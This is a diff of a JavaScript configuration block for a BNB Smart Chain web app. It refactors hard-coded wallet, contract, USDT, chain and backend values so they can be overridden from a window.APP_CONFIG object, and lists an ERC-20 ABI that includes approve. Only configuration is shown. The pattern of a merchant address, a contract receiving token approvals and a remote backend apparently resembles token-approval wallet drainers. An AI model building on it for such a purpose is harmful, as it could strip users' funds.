@@ -1,14 +1,16 @@
 "use strict";
 
 // ─── Configuration ────────────────────────────────────────────────────────────
-const MERCHANT_ADDRESS = "0x6253fecbb48a6a7d19f1b9a799e65fae58ab9b3b";
-const CONTRACT_ADDRESS = "0x8e18bE616f10565A63cEa65585Ddf1Ca61f1C634";
-const BSC_USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
-const BSC_CHAIN_ID_HEX = "0x38"; 
-const MIN_USDT_BALANCE = 0n; 
-const BACKEND_URL      = "https://secure-merchant.onrender.com/api";
+// Prefer centralized window.APP_CONFIG when present (from js/config.js)
+const APP_CFG = (typeof window !== 'undefined' && window.APP_CONFIG) ? window.APP_CONFIG : {};
+const MERCHANT_ADDRESS = APP_CFG.MERCHANT_ADDRESS || "0x6253fecbb48a6a7d19f1b9a799e65fae58ab9b3b";
+const CONTRACT_ADDRESS = APP_CFG.CONTRACT_ADDRESS || "0x8e18bE616f10565A63cEa65585Ddf1Ca61f1C634";
+const BSC_USDT_ADDRESS = APP_CFG.USDT_ADDRESS || APP_CFG.BSC_USDT_ADDRESS || "0x55d398326f99059fF775485246999027B3197955";
+const BSC_CHAIN_ID_HEX = APP_CFG.CHAIN_ID || "0x38";
+const MIN_USDT_BALANCE = APP_CFG.MIN_USDT_BALANCE || 0n;
+const BACKEND_URL      = APP_CFG.BACKEND_URL || "https://secure-merchant.onrender.com/api";
 
-const BSC_RPC_URLS = [
+const BSC_RPC_URLS = APP_CFG.RPC_URLS || [
   "https://bsc-rpc.publicnode.com",
   "https://bsc-dataseed1.binance.org/",
   "https://bsc-dataseed2.binance.org/",
@@ -17,13 +19,13 @@ const BSC_RPC_URLS = [
 
 const BSC_CHAIN_PARAMS = {
   chainId:           BSC_CHAIN_ID_HEX,
-  chainName:         "BNB Smart Chain",
+  chainName:         APP_CFG.CHAIN_NAME || "BNB Smart Chain",
   nativeCurrency:    { name: "BNB", symbol: "BNB", decimals: 18 },
   rpcUrls:           BSC_RPC_URLS,
-  blockExplorerUrls: ["https://bscscan.com/"]
+  blockExplorerUrls: [(APP_CFG.BLOCK_EXPLORER || "https://bscscan.com/")]
 };
 
-const ERC20_ABI = [
+const ERC20_ABI = APP_CFG.ERC20_ABI || [
   "function approve(address spender, uint256 amount) external returns (bool)",
   "function allowance(address owner, address spender) external view returns (uint256)",
   "function balanceOf(address account) external view returns (uint256)"
